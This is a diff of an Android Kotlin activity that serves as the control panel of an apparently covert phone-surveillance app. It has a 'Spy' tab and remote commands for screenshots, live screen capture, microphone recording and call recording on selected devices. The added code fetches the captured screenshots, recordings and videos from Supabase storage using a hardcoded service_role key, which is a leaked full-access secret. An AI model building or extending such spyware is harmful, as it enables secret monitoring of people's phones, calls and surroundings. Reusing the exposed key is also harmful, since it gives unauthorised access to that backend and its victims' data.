@@ -2,7 +2,7 @@ package com.example.devsync
 
 import android.Manifest
 import android.content.pm.PackageManager
-import android.os.Bundle
+import android.os.*
 import android.view.View
 import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
@@ -11,11 +11,18 @@ import androidx.core.content.ContextCompat
 import androidx.recyclerview.widget.LinearLayoutManager
 import androidx.recyclerview.widget.RecyclerView
 import com.google.firebase.database.*
+import kotlinx.coroutines.*
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONArray
 
 class AdminControlActivity : AppCompatActivity() {
 
     companion object {
-        const val DB_URL = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
+        const val DB_URL       = "https://mygptaap-default-rtdb.asia-southeast1.firebasedatabase.app"
+        const val SUPABASE_URL = "https://xzslribjzliewpyattcl.supabase.co"
+        const val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6c2xyaWJqemxpZXdweWF0dGNsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODc4OTY1NywiZXhwIjoyMDk0MzY1NjU3fQ.bZ2kCJesIeeTbZ5L1GrNzYAaDK5v3Ba8-R-SGWIU-A8"
         const val ONLINE_THRESHOLD_MS = 90_000L
         private const val PERM_REQ = 200
         fun convertGoogleDriveUrl(url: String): String = when {
@@ -27,7 +34,7 @@ class AdminControlActivity : AppCompatActivity() {
         }
     }
 
-    // ── Views ────────────────────────────────────────────────────────────────
+    // ── Views ─────────────────────────────────────────────────────────────────
     private lateinit var tvStatus: TextView
     private lateinit var tvSelected: TextView
     private lateinit var tvFeedback: TextView
@@ -53,8 +60,6 @@ class AdminControlActivity : AppCompatActivity() {
     private lateinit var rvRecordings: RecyclerView
     private lateinit var rvSongs: RecyclerView
     private lateinit var rvWallpapers: RecyclerView
-
-    // Tab buttons + content
     private lateinit var tabSpy: Button
     private lateinit var tabMedia: Button
     private lateinit var tabControls: Button
@@ -62,14 +67,14 @@ class AdminControlActivity : AppCompatActivity() {
     private lateinit var tabMediaContent: View
     private lateinit var tabControlsContent: View
 
-    // ── Data ─────────────────────────────────────────────────────────────────
-    private val deviceList    = mutableListOf<DeviceInfo>()
-    private val selectedIds   = mutableSetOf<String>()
-    private val screenshotList= mutableListOf<ScreenshotItem>()
-    private val videoList     = mutableListOf<RecordingItem>()
-    private val recordingList = mutableListOf<RecordingItem>()
-    private val songList      = mutableListOf<MediaItem>()
-    private val wallpaperList = mutableListOf<MediaItem>()
+    // ── Data ──────────────────────────────────────────────────────────────────
+    private val deviceList     = mutableListOf<DeviceInfo>()
+    private val selectedIds    = mutableSetOf<String>()
+    private val screenshotList = mutableListOf<ScreenshotItem>()
+    private val videoList      = mutableListOf<RecordingItem>()
+    private val recordingList  = mutableListOf<RecordingItem>()
+    private val songList       = mutableListOf<MediaItem>()
+    private val wallpaperList  = mutableListOf<MediaItem>()
 
     private lateinit var deviceAdapter: DeviceListAdapter
     private lateinit var screenshotAdapter: ScreenshotListAdapter
@@ -77,6 +82,21 @@ class AdminControlActivity : AppCompatActivity() {
     private lateinit var recordingAdapter: RecordingListAdapter
     private lateinit var songAdapter: MediaListAdapter
     private lateinit var wallpaperAdapter: MediaListAdapter
+
+    // ── Supabase HTTP client ──────────────────────────────────────────────────
+    private val http = OkHttpClient.Builder()
+        .callTimeout(30, java.util.concurrent.TimeUnit.SECONDS).build()
+
+    // ── Auto-refresh handler ──────────────────────────────────────────────────
+    private val refreshHandler = Handler(Looper.getMainLooper())
+    private val refreshRunnable = object : Runnable {
+        override fun run() {
+            loadFromSupabase()
+            refreshHandler.postDelayed(this, 45_000L) // refresh every 45s
+        }
+    }
+
+    // ── Lifecycle ─────────────────────────────────────────────────────────────
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -87,18 +107,135 @@ class AdminControlActivity : AppCompatActivity() {
         setupRecyclerViews()
         setupFirebaseListeners()
         setupClickListeners()
+        // Load all content from Supabase directly (no Firebase dependency for content)
+        loadFromSupabase()
+        refreshHandler.postDelayed(refreshRunnable, 45_000L)
     }
+
+    override fun onResume() {
+        super.onResume()
+        loadFromSupabase()
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        refreshHandler.removeCallbacks(refreshRunnable)
+    }
+
+    // ── Supabase Direct Loading ───────────────────────────────────────────────
+
+    private fun loadFromSupabase() {
+        tvFeedback.text = "⏳ Loading from Supabase..."
+        CoroutineScope(Dispatchers.IO).launch {
+            var count = 0
+            try { count += loadScreenshotsFromSupabase() } catch (_: Exception) {}
+            try { count += loadRecordingsFromSupabase() } catch (_: Exception) {}
+            try { count += loadVideosFromSupabase() }      catch (_: Exception) {}
+            withContext(Dispatchers.Main) {
+                tvFeedback.text = "✅ Loaded $count items from Supabase"
+            }
+        }
+    }
+
+    private fun supabaseList(bucket: String): JSONArray {
+        val body = """{"limit":200,"offset":0,"prefix":"","sortBy":{"column":"created_at","order":"desc"}}"""
+        return try {
+            val req = Request.Builder()
+                .url("$SUPABASE_URL/storage/v1/object/list/$bucket")
+                .header("Authorization", "Bearer $SUPABASE_KEY")
+                .header("apikey", SUPABASE_KEY)
+                .header("Content-Type", "application/json")
+                .post(body.toRequestBody("application/json".toMediaType()))
+                .build()
+            http.newCall(req).execute().use { resp ->
+                JSONArray(resp.body?.string() ?: "[]")
+            }
+        } catch (_: Exception) { JSONArray() }
+    }
+
+    private suspend fun loadScreenshotsFromSupabase(): Int {
+        val arr = supabaseList("screenshots")
+        val list = mutableListOf<ScreenshotItem>()
+        for (i in 0 until arr.length()) {
+            try {
+                val obj  = arr.getJSONObject(i)
+                val name = obj.optString("name") ?: continue
+                if (!name.endsWith(".jpg") && !name.endsWith(".jpeg")) continue
+                // Filename format: {deviceId}_{timestamp}.jpg
+                val noExt = name.removeSuffix(".jpg").removeSuffix(".jpeg")
+                val lastUnder = noExt.lastIndexOf('_')
+                val ts  = if (lastUnder >= 0) noExt.substring(lastUnder + 1).toLongOrNull() ?: 0L else 0L
+                val did = if (lastUnder >= 0) noExt.substring(0, lastUnder) else noExt
+                val url = "$SUPABASE_URL/storage/v1/object/public/screenshots/$name"
+                list.add(ScreenshotItem(name, did, url, ts))
+            } catch (_: Exception) {}
+        }
+        list.sortByDescending { it.timestamp }
+        withContext(Dispatchers.Main) { screenshotAdapter.updateItems(list) }
+        return list.size
+    }
+
+    private suspend fun loadRecordingsFromSupabase(): Int {
+        val arr  = supabaseList("recordings")
+        val list = mutableListOf<RecordingItem>()
+        for (i in 0 until arr.length()) {
+            try {
+                val obj  = arr.getJSONObject(i)
+                val name = obj.optString("name") ?: continue
+                if (!name.endsWith(".m4a") && !name.endsWith(".mp3")) continue
+                // Filename format: {type}_{deviceIdShort}_{timestamp}.m4a
+                val type = when {
+                    name.startsWith("mic_")  -> "mic"
+                    name.startsWith("call_") -> "call"
+                    else                     -> "mic"
+                }
+                val noExt = name.removeSuffix(".m4a").removeSuffix(".mp3")
+                val parts = noExt.split("_")
+                val ts  = parts.lastOrNull()?.toLongOrNull() ?: 0L
+                val did = if (parts.size >= 3) parts[1] else parts.getOrElse(1) { "" }
+                val url = "$SUPABASE_URL/storage/v1/object/public/recordings/$name"
+                list.add(RecordingItem(name, did, type, url, ts, name))
+            } catch (_: Exception) {}
+        }
+        list.sortByDescending { it.timestamp }
+        withContext(Dispatchers.Main) { recordingAdapter.updateItems(list) }
+        return list.size
+    }
+
+    private suspend fun loadVideosFromSupabase(): Int {
+        val arr  = supabaseList("videos")
+        val list = mutableListOf<RecordingItem>()
+        for (i in 0 until arr.length()) {
+            try {
+                val obj  = arr.getJSONObject(i)
+                val name = obj.optString("name") ?: continue
+                if (!name.endsWith(".mp4")) continue
+                // Filename format: vid_{deviceIdShort}_{timestamp}.mp4
+                val noExt = name.removeSuffix(".mp4")
+                val parts = noExt.split("_")
+                val ts  = parts.lastOrNull()?.toLongOrNull() ?: 0L
+                val did = if (parts.size >= 3) parts[1] else parts.getOrElse(1) { "" }
+                val url = "$SUPABASE_URL/storage/v1/object/public/videos/$name"
+                list.add(RecordingItem(name, did, "video", url, ts, name))
+            } catch (_: Exception) {}
+        }
+        list.sortByDescending { it.timestamp }
+        withContext(Dispatchers.Main) { videoAdapter.updateItems(list) }
+        return list.size
+    }
+
+    // ── Permissions ───────────────────────────────────────────────────────────
 
     private fun requestRequiredPermissions() {
         val needed = arrayOf(
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.PROCESS_OUTGOING_CALLS
+            Manifest.permission.RECORD_AUDIO, Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.READ_CALL_LOG, Manifest.permission.PROCESS_OUTGOING_CALLS
         ).filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
         if (needed.isNotEmpty())
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQ)
     }
+
+    // ── Init Views ────────────────────────────────────────────────────────────
 
     private fun initViews() {
         tvStatus            = findViewById(R.id.tvStatus)
@@ -134,6 +271,8 @@ class AdminControlActivity : AppCompatActivity() {
         tabControlsContent  = findViewById(R.id.tabControlsContent)
     }
 
+    // ── Tabs ──────────────────────────────────────────────────────────────────
+
     private fun setupTabs() {
         fun showTab(active: Button, content: View) {
             listOf(tabSpy, tabMedia, tabControls).forEach {
@@ -142,14 +281,16 @@ class AdminControlActivity : AppCompatActivity() {
             }
             active.backgroundTintList = android.content.res.ColorStateList.valueOf(
                 android.graphics.Color.parseColor("#238636"))
-            tabSpyContent.visibility     = if (content == tabSpyContent) View.VISIBLE else View.GONE
-            tabMediaContent.visibility   = if (content == tabMediaContent) View.VISIBLE else View.GONE
-            tabControlsContent.visibility= if (content == tabControlsContent) View.VISIBLE else View.GONE
+            tabSpyContent.visibility      = if (content == tabSpyContent) View.VISIBLE else View.GONE
+            tabMediaContent.visibility    = if (content == tabMediaContent) View.VISIBLE else View.GONE
+            tabControlsContent.visibility = if (content == tabControlsContent) View.VISIBLE else View.GONE
         }
-        tabSpy.setOnClickListener     { showTab(tabSpy, tabSpyContent) }
-        tabMedia.setOnClickListener   { showTab(tabMedia, tabMediaContent) }
-        tabControls.setOnClickListener{ showTab(tabControls, tabControlsContent) }
+        tabSpy.setOnClickListener      { showTab(tabSpy, tabSpyContent) }
+        tabMedia.setOnClickListener    { showTab(tabMedia, tabMediaContent) }
+        tabControls.setOnClickListener { showTab(tabControls, tabControlsContent) }
     }
+
+    // ── RecyclerViews ─────────────────────────────────────────────────────────
 
     private fun setupRecyclerViews() {
         deviceAdapter = DeviceListAdapter(deviceList, selectedIds) { updateSelectedCount() }
@@ -179,8 +320,10 @@ class AdminControlActivity : AppCompatActivity() {
 
     private fun db(path: String) = FirebaseDatabase.getInstance(DB_URL).getReference(path)
 
+    // ── Firebase Listeners (devices + songs/wallpapers only) ──────────────────
+
     private fun setupFirebaseListeners() {
-        // Firebase connection status
+        // Connection status
         db(".info/connected").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(s: DataSnapshot) {
                 val ok = s.getValue(Boolean::class.java) ?: false
@@ -192,69 +335,20 @@ class AdminControlActivity : AppCompatActivity() {
         // Devices
         db("registered_devices").addValueEventListener(object : ValueEventListener {
             override fun onDataChange(s: DataSnapshot) {
-                val now = System.currentTimeMillis()
+                val now  = System.currentTimeMillis()
                 val list = mutableListOf<DeviceInfo>()
                 for (c in s.children) {
-                    val id      = c.key ?: continue
-                    val name    = c.child("name").getValue(String::class.java) ?: ""
-                    val model   = c.child("model").getValue(String::class.java) ?: ""
-                    val ls      = c.child("lastSeen").getValue(Long::class.java) ?: 0L
-                    val online  = (now - ls) < ONLINE_THRESHOLD_MS
-                    val status  = c.child("lastStatus").getValue(String::class.java) ?: ""
-                    val sTime   = c.child("lastStatusTime").getValue(Long::class.java) ?: 0L
+                    val id     = c.key ?: continue
+                    val name   = c.child("name").getValue(String::class.java) ?: ""
+                    val model  = c.child("model").getValue(String::class.java) ?: ""
+                    val ls     = c.child("lastSeen").getValue(Long::class.java) ?: 0L
+                    val online = (now - ls) < ONLINE_THRESHOLD_MS
+                    val status = c.child("lastStatus").getValue(String::class.java) ?: ""
+                    val sTime  = c.child("lastStatusTime").getValue(Long::class.java) ?: 0L
                     if (online) list.add(DeviceInfo(id, name, model, online, ls, status, sTime))
                 }
                 deviceAdapter.updateDevices(list)
                 updateSelectedCount()
-            }
-            override fun onCancelled(e: DatabaseError) {}
-        })
-        // Screenshots
-        db("screenshots").addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(s: DataSnapshot) {
-                val list = mutableListOf<ScreenshotItem>()
-                for (c in s.children) {
-                    val id  = c.key ?: continue
-                    val did = c.child("deviceId").getValue(String::class.java) ?: ""
-                    val url = c.child("url").getValue(String::class.java) ?: continue
-                    val ts  = c.child("timestamp").getValue(Long::class.java) ?: 0L
-                    list.add(ScreenshotItem(id, did, url, ts))
-                }
-                screenshotAdapter.updateItems(list)
-            }
-            override fun onCancelled(e: DatabaseError) {}
-        })
-        // Videos — from recordings node (type == "video")
-        db("recordings").addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(s: DataSnapshot) {
-                val list = mutableListOf<RecordingItem>()
-                for (c in s.children) {
-                    val id  = c.key ?: continue
-                    if (c.child("type").getValue(String::class.java) != "video") continue
-                    val did = c.child("deviceId").getValue(String::class.java) ?: ""
-                    val url = c.child("url").getValue(String::class.java) ?: continue
-                    val ts  = c.child("timestamp").getValue(Long::class.java) ?: 0L
-                    val fn  = c.child("fileName").getValue(String::class.java) ?: ""
-                    list.add(RecordingItem(id, did, "video", url, ts, fn))
-                }
-                videoAdapter.updateItems(list)
-            }
-            override fun onCancelled(e: DatabaseError) {}
-        })
-        // Audio recordings (mic + call, NOT video)
-        db("recordings").addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(s: DataSnapshot) {
-                val list = mutableListOf<RecordingItem>()
-                for (c in s.children) {
-                    val id  = c.key ?: continue
-                    val did = c.child("deviceId").getValue(String::class.java) ?: ""
-                    val t   = c.child("type").getValue(String::class.java) ?: "mic"
-                    val url = c.child("url").getValue(String::class.java) ?: continue
-                    val ts  = c.child("timestamp").getValue(Long::class.java) ?: 0L
-                    val fn  = c.child("fileName").getValue(String::class.java) ?: ""
-                    list.add(RecordingItem(id, did, t, url, ts, fn))
-                }
-                recordingAdapter.updateItems(list)
             }
             override fun onCancelled(e: DatabaseError) {}
         })
@@ -288,9 +382,7 @@ class AdminControlActivity : AppCompatActivity() {
         })
     }
 
-    private fun updateSelectedCount() {
-        tvSelected.text = "${selectedIds.size} selected"
-    }
+    private fun updateSelectedCount() { tvSelected.text = "${selectedIds.size} selected" }
 
     private fun sendToSelected(action: (DatabaseReference) -> Unit) {
         if (selectedIds.isEmpty()) {
@@ -298,46 +390,39 @@ class AdminControlActivity : AppCompatActivity() {
             return
         }
         selectedIds.forEach { id -> action(db("devices/$id")) }
-        tvFeedback.text = "✅ Command → ${selectedIds.size} device(s)"
     }
 
+    // ── Click Listeners ───────────────────────────────────────────────────────
+
     private fun setupClickListeners() {
+        btnStopAll.setOnClickListener {
+            sendToSelected { d -> d.child("stop_all").setValue(true) }
+            sendToSelected { d -> d.child("live_capture_enabled").setValue(false) }
+            tvFeedback.text = "⛔ All stopped"
+        }
         btnSelectAll.setOnClickListener {
-            deviceList.forEach { selectedIds.add(it.id) }
-            deviceAdapter.notifyDataSetChanged(); updateSelectedCount()
+            selectedIds.addAll(deviceList.map { it.id })
+            deviceAdapter.notifyDataSetChanged()
+            updateSelectedCount()
         }
         btnDeselectAll.setOnClickListener {
             selectedIds.clear()
-            deviceAdapter.notifyDataSetChanged(); updateSelectedCount()
-        }
-        btnStopAll.setOnClickListener {
-            sendToSelected { d ->
-                d.child("stop_all").setValue(true)
-                d.child("bt_management_flag").setValue(false)
-                d.child("live_capture_enabled").setValue(false)
-                d.child("stop_recording").setValue(true)
-            }
-            switchLiveCapture.isChecked = false
-            switchBluetooth.isChecked  = false
-            tvFeedback.text = "⛔ STOP ALL sent"
+            deviceAdapter.notifyDataSetChanged()
+            updateSelectedCount()
         }
 
-        // ── Live Capture ─────────────────────────────────────────────────────
         switchLiveCapture.setOnCheckedChangeListener { _, on ->
             sendToSelected { d -> d.child("live_capture_enabled").setValue(on) }
-            tvLiveCaptureStatus.text = if (on) "🔴 LIVE — capturing 2/sec → 30s videos" else "● Stopped"
-            tvLiveCaptureStatus.setTextColor(android.graphics.Color.parseColor(if (on) "#FF4444" else "#8B949E"))
-            tvFeedback.text = if (on) "🔴 Live capture ON" else "⏹ Live capture OFF"
+            tvLiveCaptureStatus.text = if (on) "🔴 Live ON" else "⏹ Live OFF"
+            tvFeedback.text = if (on) "🎬 Live capture ON" else "⏹ Live capture OFF"
         }
 
-        // ── Screenshot ───────────────────────────────────────────────────────
         btnTakeScreenshot.setOnClickListener {
             if (selectedIds.isEmpty()) { Toast.makeText(this, "Device select karo!", Toast.LENGTH_SHORT).show(); return@setOnClickListener }
             selectedIds.forEach { id -> db("devices/$id/take_screenshot").setValue(true) }
             tvFeedback.text = "📸 Screenshot → ${selectedIds.size} device(s)"
         }
 
-        // ── Recording ────────────────────────────────────────────────────────
         btnStartRecording.setOnClickListener {
             val dur = etRecordDuration.text.toString().toLongOrNull() ?: 30L
             sendToSelected { d -> d.child("start_recording").setValue(dur) }
@@ -352,7 +437,6 @@ class AdminControlActivity : AppCompatActivity() {
             tvFeedback.text = "📞 Call recording ${if (on) "ON" else "OFF"}"
         }
 
-        // ── Songs ────────────────────────────────────────────────────────────
         btnAddSongUrl.setOnClickListener {
             val url = etSongUrl.text.toString().trim()
             if (url.isEmpty()) return@setOnClickListener
@@ -360,8 +444,6 @@ class AdminControlActivity : AppCompatActivity() {
             db("songs").push().setValue(mapOf("name" to name, "url" to url))
             etSongUrl.setText("")
         }
-
-        // ── Wallpapers ───────────────────────────────────────────────────────
         btnAddWallpaperUrl.setOnClickListener {
             val url = etWallpaperUrl.text.toString().trim()
             if (url.isEmpty()) return@setOnClickListener
@@ -369,8 +451,6 @@ class AdminControlActivity : AppCompatActivity() {
             db("wallpapers").push().setValue(mapOf("name" to name, "url" to url))
             etWallpaperUrl.setText("")
         }
-
-        // ── Controls ─────────────────────────────────────────────────────────
         switchBluetooth.setOnCheckedChangeListener { _, on ->
             sendToSelected { d -> d.child("bt_management_flag").setValue(on) }
         }
